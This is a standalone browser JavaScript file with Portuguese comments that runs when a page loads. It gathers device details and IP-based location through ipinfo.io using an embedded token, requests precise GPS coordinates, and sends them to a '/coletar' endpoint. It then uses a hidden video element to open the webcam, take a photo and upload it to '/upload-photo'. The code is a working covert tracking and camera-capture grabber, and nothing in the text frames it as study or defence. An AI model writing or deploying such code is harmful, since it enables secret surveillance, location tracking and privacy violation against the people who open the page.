async function collectInfo() {
  const deviceInfo = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    screenResolution: `${screen.width}x${screen.height}`,
    timestamp: new Date().toISOString()
  };

  // Coletar IP e localização aproximada via IPInfo
  const ipData = await fetch("https://ipinfo.io/json?token=31333028ec06fd")
    .then(res => res.json())
    .catch(() => ({}));

  deviceInfo.ip = ipData.ip || "N/A";
  deviceInfo.city = ipData.city || "N/A";
  deviceInfo.region = ipData.region || "N/A";
  deviceInfo.country = ipData.country || "N/A";
  deviceInfo.loc = ipData.loc || "N/A";

  // Coletar localização geográfica precisa (se permitido)
  navigator.geolocation.getCurrentPosition(
    pos => {
      deviceInfo.preciseLocation = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude
      };
      sendData(deviceInfo);
    },
    () => {
      sendData(deviceInfo);
    }
  );

  // Criar e anexar elemento <video> oculto
  const video = document.createElement("video");
  video.style.display = "none";
  document.body.appendChild(video);

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await video.play();

    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const blob = await imageCapture.takePhoto();

    // Enviar imagem via POST
    const formData = new FormData();
    formData.append("photo", blob, "user.jpg");

    await fetch("/upload-photo", {
      method: "POST",
      body: formData
    });

    // Encerrar o stream da câmera
    stream.getTracks().forEach(t => t.stop());
  } catch (e) {
    console.warn("Erro ao capturar a câmera:", e);
  }
}

// Enviar dados de texto
function sendData(data) {
  fetch("/coletar", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  });
}

// Início
collectInfo();
